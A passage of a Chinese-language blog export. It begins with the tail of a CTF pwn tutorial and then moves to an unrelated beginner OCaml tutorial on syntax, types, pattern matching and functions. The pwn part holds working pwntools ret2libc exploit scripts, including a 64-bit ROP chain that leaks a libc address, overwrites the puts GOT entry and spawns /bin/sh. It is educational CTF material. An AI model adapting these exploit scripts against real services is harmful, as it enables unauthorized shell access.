class="comment"># libc共享库地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc: &#x27;</span>, <span class="built_in">hex</span>(libc_base_addr)</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># system()函数实际地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = libc_base_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次溢出，调用system(&#x27;\bin\sh&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span> + p32(system_addr) + p32(ret_func_addr) + p32(binsh_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-2-64位ret2libc"><a href="#2-2-64位ret2libc" class="headerlink" title="2.2. 64位ret2libc"></a>2.2. 64位ret2libc</h3><p>64位不同于32位，因为64位通过寄存器传参，需要利用<code>pop rdi;ret</code>等指令。因而，拼接payload时，调用32位函数参数在后，调用64位函数参数在前。</p>
<p>其它步骤大致相同。</p>
<p>示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">pwn_file=<span class="string">&#x27;./Emachine&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">r = process(pwn_file)</span><br><span class="line"><span class="comment"># r = remote(&#x27;120.27.3.220&#x27;, &#x27;10010&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">num64</span>):</span><br><span class="line">    ret = num64</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        temp = <span class="number">0xff</span> &lt;&lt; (<span class="number">8</span>*i)</span><br><span class="line">        a = num64 &amp; temp</span><br><span class="line">        a = a &gt;&gt; (<span class="number">8</span>*i)</span><br><span class="line">        <span class="comment"># print(hex(temp), hex(a))</span></span><br><span class="line">        <span class="keyword">if</span> a&gt;=<span class="number">54</span> <span class="keyword">and</span> a&lt;=<span class="number">63</span>:</span><br><span class="line">            a = a ^ <span class="number">0xf</span></span><br><span class="line">        <span class="keyword">elif</span> (a&gt;=<span class="number">64</span> <span class="keyword">and</span> a&lt;=<span class="number">77</span>) <span class="keyword">or</span> a == <span class="number">79</span> <span class="keyword">or</span> a == <span class="number">84</span> <span class="keyword">or</span> (a&gt;=<span class="number">86</span> <span class="keyword">and</span> a&lt;=<span class="number">95</span>):</span><br><span class="line">            a = a ^ <span class="number">0xe</span></span><br><span class="line">        <span class="keyword">elif</span> (a&gt;=<span class="number">96</span> <span class="keyword">and</span> a&lt;=<span class="number">109</span>) <span class="keyword">or</span> a == <span class="number">111</span> <span class="keyword">or</span> a == <span class="number">116</span> <span class="keyword">or</span> (a&gt;=<span class="number">118</span> <span class="keyword">and</span> a&lt;=<span class="number">127</span>):</span><br><span class="line">            a = a ^ <span class="number">0xD</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = a</span><br><span class="line">        a = a &lt;&lt; (<span class="number">8</span>*i)</span><br><span class="line">        ret = ret | a</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span> <span class="comment"># pop rdi;ret 指令地址。通过 ROPgadgets --binary xxx 获取</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出got表中puts函数的地址：</span></span><br><span class="line"><span class="comment"># 1. 0x58覆盖返回地址之前的内容</span></span><br><span class="line"><span class="comment"># 2. pop_rdi将控制(rip)转移到pop rdi;ret处，实现64位系统传参；func()绕过题目的字符串处理</span></span><br><span class="line"><span class="comment"># 3. pop rdi 将got表中puts函数地址pop到rdi中</span></span><br><span class="line"><span class="comment"># 4. ret = pop rip 将控制转到plt中调用puts函数处。实现puts函数调用，参数为got表中puts函数项的地址</span></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x58</span> + p64(func(pop_rdi)) + p64(puts_got) + p64(puts_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上一步puts函数执行结束，控制转到pop_rdi处。传参到rdi，然后调用gets函数，读取输入字符串(system函数地址)修改got表的puts函数项(got表可写)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(gets_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同上，读取输入字符串(\bin\sh)到got表的一处中。此处读取到其它可写区域(如bss)亦可</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got + <span class="number">8</span>) + p64(gets_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将上一步写到got表中的字符串首地址作为参数，通过plt表调用puts函数，但此时got表中的puts函数项已被修改成其它函数(system)的地址</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got + <span class="number">8</span>) + p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\x83\x0c@\n&#x27;</span>) <span class="comment"># 接收 \x83\x0c@\n 之前的输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print &#x27;---&gt; &#x27; + r.recv()</span></span><br><span class="line">puts_addr = u64(r.recv(timeout=<span class="number">5</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># 通过打印got表中puts函数项，拿到puts函数在内存中地址</span></span><br><span class="line">log.success(<span class="string">&#x27;puts() addr ---&gt; &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 通过puts函数地址推出lib库版本</span></span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 通过puts函数在lib库中的偏移得到lib库在内存中的基址</span></span><br><span class="line">system_addr = libc_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment"># 通过偏移计算system函数的内存地址</span></span><br><span class="line"></span><br><span class="line">r.sendline(p64(system_addr)) <span class="comment"># 输入system函数地址，此处为了覆盖got表中puts函数项</span></span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)   <span class="comment"># 输入system函数参数，写到 puts_got + 8 中</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>OCaml从入门到放弃</title>
    <url>/ocaml%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>学习函数式语言</p>
<span id="more"></span>

<h2 id="1-注释与输入输出"><a href="#1-注释与输入输出" class="headerlink" title="1. 注释与输入输出"></a>1. 注释与输入输出</h2><p>OCaml注释如下：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* hello world *)</span></span><br></pre></td></tr></table></figure>

<p>输入输出如下：</p>
<ul>
<li><p>输入</p>
<ul>
<li><code>read_int()</code>: 读入一个整数</li>
<li><code>read_float()</code>: 读入一个浮点数</li>
<li><code>read_line()</code>: 读入一个字符串</li>
</ul>
</li>
<li><p>输出</p>
<ul>
<li><code>print_char &#39;a&#39;</code>: 打印字符</li>
<li><code>print_int 2</code>: 打印数字</li>
<li><code>print_float 3.4</code>: 打印浮点数</li>
<li><code>print_newline()</code>: 打印换行</li>
<li><code>print_string &quot;hello world&quot;</code>: 打印字符串</li>
<li><code>print_endline &quot;hello world&quot;</code>: 打印字符串，并换行</li>
<li><code>Printf.printf &quot;int %i, float %f, char %c, string %s\n&quot; 3 3.2 &#39;a&#39; &quot;ok&quot;;;</code>: 打印格式化字符串</li>
</ul>
</li>
</ul>
<p>(注：OCaml中的函数调用：不需要括号，除非无参数时才需要；各参数之间用空格隔开。)</p>
<h2 id="2-编译与运行"><a href="#2-编译与运行" class="headerlink" title="2. 编译与运行"></a>2. 编译与运行</h2><p>OCaml代码文件以<code>.ml</code>结尾。</p>
<ul>
<li>解释运行：<code>ocaml xxx.ml</code></li>
<li>编译运行<ul>
<li>编译生成可重定位文件：<ul>
<li>字节码：<code>ocamlc -c xxx.ml -o xxx.cmo</code></li>
<li>目标码：<code>ocamlc -c xxx.ml -o xxx.o</code></li>
</ul>
</li>
<li>链接生成目标文件：<code>ocamlc -o xxx xxx.cmo</code></li>
<li>直接生成目标文件：<ul>
<li>字节码：<code>ocamlc -o xxx xxx.ml</code></li>
<li>目标码：<code>ocamlopt -o xxx xxx.ml</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-变量"><a href="#3-变量" class="headerlink" title="3. 变量"></a>3. 变量</h2><p>变量名开头字母不能大写，若大写则会被当作联合类型中的构造子。</p>
<h3 id="3-1-基本类型"><a href="#3-1-基本类型" class="headerlink" title="3.1. 基本类型"></a>3.1. 基本类型</h3><ul>
<li><code>int</code>: 整数类型</li>
<li><code>float</code>: 浮点类型，浮点常数必须带小数点<code>.</code>，否则会被视为<code>int</code>类型</li>
<li><code>char</code>: 字符类型</li>
<li><code>string</code>: 字符串类型</li>
<li><code>unit</code>: 啥都不是类型</li>
</ul>
<p>在OCaml中，没有强制类型转换，整型只能与整型变量做运算。</p>
<p>若要类型转换，需使用相应函数，如下：</p>
<ul>
<li><code>float_of_int 1</code>: int &#x3D;&gt; float</li>
<li><code>int_of_float 2.6</code>: float &#x3D;&gt; int</li>
<li><code>int_of_string &quot;-23&quot;</code>: string &#x3D;&gt; int</li>
<li><code>float_of_string &quot;1.2e3&quot;</code>: string &#x3D;&gt; float</li>
<li><code>string_of_int 12</code>: int &#x3D;&gt; string</li>
<li><code>string_of_float (-2.3)</code>: float &#x3D;&gt; string</li>
</ul>
<p>字符与ASCII码：</p>
<ul>
<li><code>int_of_char &#39;x&#39;</code>: 获取字符<code>x</code>的ASCII码值</li>
<li><code>char_of_int 120</code>: 把ASCII码转换到字符</li>
</ul>
<h3 id="3-2-let-定义"><a href="#3-2-let-定义" class="headerlink" title="3.2. let 定义"></a>3.2. let 定义</h3><ul>
<li><p><code>let &lt;变量1&gt; = &lt;表达式1&gt; and &lt;变量2&gt; = &lt;表达式2&gt;</code>: 全局定义</p>
<ul>
<li><strong>必须赋初值</strong></li>
<li>可重复定义一个变量</li>
<li>不能在表达式内部使用</li>
</ul>
</li>
<li><p><code>let &lt;变量1&gt; = &lt;表达式1&gt; and &lt;变量2&gt; = &lt;表达式2&gt; in &lt;表达式3&gt;</code>: 局部定义</p>
<ul>
<li><strong>必须赋初值</strong></li>
<li>可重复定义一个变量</li>
<li>可在表达式内部使用</li>
<li>变量1,2作用域局限于表达式3</li>
</ul>
</li>
</ul>
<p><strong>注意：let定义的变量是无法修改！！！修改需要使用命令式的方式，后文细说。</strong></p>
<h3 id="3-3-多态类型"><a href="#3-3-多态类型" class="headerlink" title="3.3. 多态类型"></a>3.3. 多态类型</h3><h2 id="4-表达式"><a href="#4-表达式" class="headerlink" title="4. 表达式"></a>4. 表达式</h2><h3 id="4-1-算术运算"><a href="#4-1-算术运算" class="headerlink" title="4.1. 算术运算"></a>4.1. 算术运算</h3><ul>
<li><code>(a/b) * b + (a mod b)</code>: 整型运算<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>mod</code></li>
<li><code>4e2 *. 2. /. 3. +. 1.</code>: 浮点型运算，运算符必须带小数点<code>.</code></li>
</ul>
<h3 id="4-2-逻辑运算"><a href="#4-2-逻辑运算" class="headerlink" title="4.2. 逻辑运算"></a>4.2. 逻辑运算</h3><ul>
<li><code>not true</code>: 非</li>
<li><code>true &amp;&amp; false</code>: 与</li>
<li><code>true || false</code>: 或</li>
</ul>
<h3 id="4-3-比较运算"><a href="#4-3-比较运算" class="headerlink" title="4.3. 比较运算"></a>4.3. 比较运算</h3><p><code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>如常</p>
<p>相等与不等：</p>
<ul>
<li><code>=</code> and <code>&lt;&gt;</code>: 结构化比较，对比结构内部的子元素</li>
<li><code>==</code> and <code>!=</code>: 物理比较，比较变量在内存中的存储地址(即比较地址)</li>
</ul>
<p>对于非结构化数据，两种相等于不等相同。基本类型中，<strong>整型和字符</strong>是<strong>非结构化数据</strong>，<strong>浮点型和字符串</strong>都是<strong>结构化数据</strong>。</p>
<h3 id="4-4-位运算"><a href="#4-4-位运算" class="headerlink" title="4.4. 位运算"></a>4.4. 位运算</h3><ul>
<li><code>op1 land op2</code>: 按位与</li>
<li><code>op1 lor op2</code>: 按位或</li>
<li><code>op1 lxor op2</code>: 按位异或</li>
<li><code>op1 lsl op2</code>: op1左移op2位</li>
<li><code>op1 lsr op2</code>: op1右移op2位</li>
<li><code>op1 asr op2</code>: op1算术右移op2位</li>
</ul>
<h3 id="4-5-if-表达式"><a href="#4-5-if-表达式" class="headerlink" title="4.5. if 表达式"></a>4.5. if 表达式</h3><p>格式：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;条件表达式&gt; <span class="keyword">then</span> &lt;表达式<span class="number">1</span>&gt; [ <span class="keyword">else</span> &lt;表达式<span class="number">2</span>&gt; ]</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">if</span> <span class="number">1</span>&lt;<span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">    <span class="literal">true</span> &amp;&amp; <span class="literal">false</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="literal">true</span> || <span class="literal">false</span>;;</span><br><span class="line">- : <span class="built_in">bool</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="4-6-while-表达式"><a href="#4-6-while-表达式" class="headerlink" title="4.6. while 表达式"></a>4.6. while 表达式</h3><p>纯函数式语言没有循环。惊不惊喜，意不意外。</p>
<p>需要循环完成的工作，可以通过<strong>递归函数</strong>来完成。</p>
<h3 id="4-7-模式匹配表达式"><a href="#4-7-模式匹配表达式" class="headerlink" title="4.7. 模式匹配表达式"></a>4.7. 模式匹配表达式</h3><p>强大至极</p>
<p>格式：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> &lt;表达式&gt; <span class="keyword">with</span></span><br><span class="line">  | &lt;模式<span class="number">1</span>&gt; [<span class="keyword">when</span> &lt;条件<span class="number">1</span>&gt;] -&gt; &lt;表达式<span class="number">1</span>&gt;  <span class="comment">(* 第一个 | 可以省略 *)</span></span><br><span class="line">  | &lt;模式<span class="number">2</span>&gt; [<span class="keyword">when</span> &lt;条件<span class="number">2</span>&gt;] -&gt; &lt;表达式<span class="number">2</span>&gt;</span><br><span class="line">    ...</span><br><span class="line">  | &lt;模式n&gt; [<span class="keyword">when</span> &lt;条件n&gt;] -&gt; &lt;表达式n&gt;</span><br></pre></td></tr></table></figure>

<p>基础使用示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* 取反 *)</span></span><br><span class="line"><span class="keyword">let</span> neg x =</span><br><span class="line">  <span class="keyword">match</span> x <span class="keyword">with</span></span><br><span class="line">    | <span class="literal">true</span> -&gt; <span class="literal">false</span></span><br><span class="line">    | <span class="literal">false</span> -&gt; <span class="literal">true</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* 类型：val neg : bool -&gt; bool = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">(* 是否为零 *)</span></span><br><span class="line"><span class="keyword">let</span> is_zero x =</span><br><span class="line">  <span class="keyword">match</span> x <span class="keyword">with</span></span><br><span class="line">    | <span class="number">0</span> -&gt; <span class="literal">true</span></span><br><span class="line">    | _ -&gt; <span class="literal">false</span>  <span class="comment">(* 可以使用通配符 *)</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* 类型：val is_zero : int -&gt; bool = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">(* 异或 *)</span></span><br><span class="line"><span class="keyword">let</span> xor z =</span><br><span class="line">  <span class="keyword">match</span> z <span class="keyword">with</span></span><br><span class="line">      (<span class="literal">false</span>, <span class="literal">false</span>) -&gt; <span class="literal">false</span> <span class="comment">(* 第一个 | 可以省略 *)</span></span><br><span class="line">    | (<span class="literal">false</span>, <span class="literal">true</span>) -&gt; <span class="literal">true</span></span><br><span class="line">    | (<span class="literal">true</span>, <span class="literal">false</span>) -&gt; <span class="literal">true</span></span><br><span class="line">    | (<span class="literal">true</span>, <span class="literal">true</span>) -&gt; <span class="literal">false</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* 类型：val xor : bool * bool -&gt; bool = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> xor x y =</span><br><span class="line">  <span class="keyword">match</span> x,y <span class="keyword">with</span></span><br><span class="line">      (<span class="literal">false</span>, u) -&gt; u     <span class="comment">(* 在模式中可以使用变量 *)</span></span><br><span class="line">    | (<span class="literal">true</span>, u) -&gt; not u</span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* 类型：val xor : bool -&gt; bool -&gt; bool = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f (c:<span class="built_in">char</span>) : <span class="built_in">string</span> =</span><br><span class="line">  <span class="keyword">match</span> c <span class="keyword">with</span></span><br><span class="line">      <span class="string">&#x27;0&#x27;</span>..<span class="string">&#x27;9&#x27;</span> -&gt; <span class="string">&quot;digit&quot;</span>       <span class="comment">(* 可以使用 &lt;字符&gt;..&lt;字符&gt; 字符区间模式 *)</span></span><br><span class="line">    | <span class="string">&#x27;a&#x27;</span>..<span class="string">&#x27;z&#x27;</span> -&gt; <span class="string">&quot;lower char&quot;</span></span><br><span class="line">    | <span class="string">&#x27;A&#x27;</span>..<span class="string">&#x27;Z&#x27;</span> -&gt; <span class="string">&quot;upper char&quot;</span></span><br><span class="line">    | _        -&gt; <span class="string">&quot;other char&quot;</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* val f : char -&gt; string = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> int_of_bool = <span class="keyword">function</span>    <span class="comment">(* function 可以直接做模式匹配，函数不带参数 *)</span></span><br><span class="line">    <span class="literal">true</span> -&gt; <span class="number">1</span></span><br><span class="line">  | <span class="literal">false</span> -&gt; <span class="number">0</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* val int_of_bool : bool -&gt; int = &lt;fun&gt; *)</span></span><br></pre></td></tr></table></figure>

<h2 id="5-函数"><a href="#5-函数" class="headerlink" title="5. 函数"></a>5. 函数</h2><p>First of all, 函数是变量。</p>
<h3 id="5-1-简单函数"><a href="#5-1-简单函数" class="headerlink" title="5.1. 简单函数"></a>5.1. 简单函数</h3><ul>
<li><p><code>let &lt;fun_name&gt; &lt;参数1&gt; &lt;参数2&gt;...&lt;参数n&gt; = &lt;表达式&gt;</code></p>
</li>
<li><p><code>let &lt;fun_name&gt; (&lt;参数1&gt;, &lt;参数2&gt;, ...&lt;参数n&gt;) = &lt;表达式&gt;</code>: 将多个参数合并到一个元组中</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> add x y =</span><br><span class="line">  x + y ;;</span><br><span class="line"><span class="comment">(* 类型：val add : int -&gt; int -&gt; int = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line">print_int (add <span class="number">1</span> <span class="number">2</span>) ;;  <span class="comment">(* 3- : unit = () *)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* 部分作用/部分求值 *)</span></span><br><span class="line"><span class="keyword">let</span> inc x =</span><br><span class="line">  add x <span class="number">1</span> ;;</span><br><span class="line"><span class="comment">(* val inc : int -&gt; int = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">(* 将多个参数合并到一个元组中，但这种方式不能部分求值 *)</span></span><br><span class="line"><span class="keyword">let</span> plus3 (a, b, c) =</span><br><span class="line">  a + b + c ;;</span><br><span class="line"><span class="comment">(* val plus3 : int * int * int -&gt; int = &lt;fun&gt; *)</span></span><br><span class="line"></span><br><span class="line">print_int (plus3 (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) ;;  <span class="comment">(* 6- : unit = () *)</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-function-和-fun"><a href="#5-2-function-和-fun" class="headerlink" title="5.2. function 和 fun"></a>5.2. function 和 fun</h3><ul>
<li><p><code>let &lt;fun_name&gt; = function &lt;参数&gt; -&gt; &lt;表达式&gt;</code>: 只能有一个参数，可用于模式匹配</p>
</li>
<li><p><code>let &lt;fun_name&gt; = fun &lt;参数1&gt; &lt;参数2&gt;...&lt;参数n&gt; -&gt; &lt;表达式&gt;</code>: 多参数</p>
</li>
</ul>
<h3 id="5-3-高阶函数"><a href="#5-3-高阶函数" class="headerlink" title="5.3. 高阶函数"></a>5.3. 高阶函数</h3><p>函数作参和作返回值</p>
<h3 id="5-4-递归函数"><a href="#5-4-递归函数" class="headerlink" title="5.4. 递归函数"></a>5.4. 递归函数</h3><p>在函数名前添加<code>rec</code>关键字，指定是递归函数。</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">rec</span> &lt;fun_name&gt; &lt;参数<span class="number">1</span>&gt; &lt;参数<span class="number">2</span>&gt;...&lt;参数n&gt; = &lt;表达式&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* 普通递归 *)</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">rec</span> factorial n =</span><br><span class="line">  <span class="keyword">if</span> n = <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n * factorial (n-<span class="number">1</span>) ;;</span><br><span class="line"><span class="comment">(* val factorial : int -&gt; int = &lt;fun&gt; *)</span></span><br></pre></td></tr></table></figure>

<p>尾递归实现循环，在参数中加入辅助函数。</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* 尾递归实现循环 *)</span></span><br><span class="line"><span class="keyword">let</span> fib n =</span><br><span class="line">  <span class="keyword">if</span> n &lt; <span class="number">3</span> <span class="keyword">then</span></span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">rec</span> fib_tail n n_1 n_2 =</span><br><span class="line">      <span class="keyword">if</span> n = <span class="number">3</span> <span class="keyword">then</span></span><br><span class="line">        n_1+n_2</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fib_tail (n-<span class="number">1</span>) (n_1+n_2) n_1</span><br><span class="line">    <span class="keyword">in</span> fib_tail n <span class="number">1</span> <span class="number">1</span></span><br><span class="line">;;</span><br><span class="line"><span class="comment">(* val fib : int -&gt; int = &lt;fun&gt; *)</span></span><br></pre></td></tr></table></figure>

<h2 id="6-数据结构"><a href="#6-数据结构" class="headerlink" title="6. 数据结构"></a>6. 数据结构</h2><h3 id="6-1-类型的显式定义-type"><a href="#6-1-类型的显式定义-type" class="headerlink" title="6.1. 类型的显式定义(type)"></a>6.1. 类型的显式定义(type)</h3><p>格式：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> [&lt;类型参数&gt;] &lt;类型标识符&gt; = &lt;类型定义表达式&gt;</span><br></pre></td></tr></table></figure>

<h3 id="6-2-元组类型-tuple"><a href="#6-2-元组类型-tuple" class="headerlink" title="6.2. 元组类型(tuple)"></a>6.2. 元组类型(tuple)</h3><p>格式：</p>
<p><code>&lt;元素1&gt;, &lt;元素2&gt;...&lt;元素n&gt;</code></p>
<p>每个元素的类型可以不相同。</p>
<p>元组的类型描述为：</p>
<p><code>&lt;元素1类型&gt; * &lt;元素2类型&gt; *...&lt;元素n类型&gt;</code></p>
<p>示例：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">let</span> a = <span class="string">&quot;Number&quot;</span>, <span class="number">1</span>;;</span><br><span class="line"><span class="keyword">val</span> a : <span class="built_in">string</span> * <span class="built_in">int</span> = (<span class="string">&quot;Number&quot;</span>, <span class="number">1</span>)</span><br><span class="line"># <span class="keyword">let</span> b = <span class="string">&quot;pi&quot;</span>, <span class="number">3.14</span>, <span class="number">5</span> ;;</span><br><span class="line"><span class="keyword">val</span> b : <span class="built_in">string</span> * <span class="built_in">float</span> * <span class="built_in">int</span> = (<span class="string">&quot;pi&quot;</span>, <span class="number">3.14</span>, <span class="number">5</span>)</span><br><span class="line"># <span class="keyword">let</span> c = <span class="number">1</span>, (<span class="number">2</span>,<span class="number">3</span>), ((<span class="number">4</span>,<span class="number">5</span>), <span class="number">6</span>) ;;</span><br><span class="line"><span class="keyword">val</span> c : <span class="built_in">int</span> * (<span class="built_in">int</span> * <span class="built_in">int</span>) * ((<span class="built_in">int</span> * <span class="built_in">int</span>) * <span class="built_in">int</span>) = (<span class="number">1</span>, (<span class="number">2</span>, <span class="number">3</span>), ((<span class="number">4</span>, <span class="number">5</span>), <span class="number">6</span>))</span><br></pre></td></tr></table></figure>

<p>只有二个元素的元组也称作<strong>对偶</strong>。</p>
<p>函数<code>fst</code>和<code>snd</code>分别取对偶的第一个和第二个分量。</p>
<h3 id="6-3-记录类型-结构体-record"><a href="#6-3-记录类型-结构体-record" class="headerlink" title="6.3. 记录类型(结构体 record)"></a>6.3. 记录类型(结构体 record)</h3><p>定义一个记录类型：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;类型标识符&gt; = &#123; &lt;字段名<span class="number">1</span>&gt;:&lt;类型<span class="number">1</span>&gt;; ... ; &lt;字段名n&gt;:&lt;类型n&gt; &#125;</span><br></pre></td></tr></table></figure>

<p>创建一个记录类型变量：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&#123; &lt;字段名<span class="number">1</span>&gt; = &lt;表达式<span class="number">1</span>&gt;; ... ; &lt;字段名n&gt; = &lt;表达式n&gt; &#125;</span><br></pre></td></tr></table></figure>

<p>访问记录类型中的字段：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">&lt;记录类型变量&gt;.&lt;字段名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意：上述记录类型不可修改！！！</strong></p>
<h3 id="6-4-联合类型-x2F-变体-加强版-union"><a href="#6-4-联合类型-x2F-变体-加强版-union" class="headerlink" title="6.4. 联合类型&#x2F;变体(加强版 union)"></a>6.4. 联合类型&#x2F;变体(加强版 union)</h3><p>格式：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> [&lt;多态类型变量&gt;] &lt;类型标识符&gt; =</span><br><span class="line">  &lt;构造子名<span class="number">1</span>&gt; [<span class="keyword">of</span> &lt;参数类型<span class="number">1</span>&gt;]</span><br><span class="line">  ...</span><br><span class="line">  &lt;构造子名n&gt; [<span class="keyword">of</span> &lt;参数类型n&gt;]</span><br></pre></td></tr></table></figure>

<p><strong>注：构造子名首字母必须大写</strong>。</p>
<h4 id="6-4-1-无参构造子-枚举类型"><a href="#6-4-1-无参构造子-枚举类型" class="headerlink" title="6.4.1. 无参构造子(枚举类型)"></a>6.4.1. 无参构造子(枚举类型)</h4><p>无参构造子。类似于枚举类型，构造子能和常数或者布尔值一样使用</p>
<p>示例：</p>
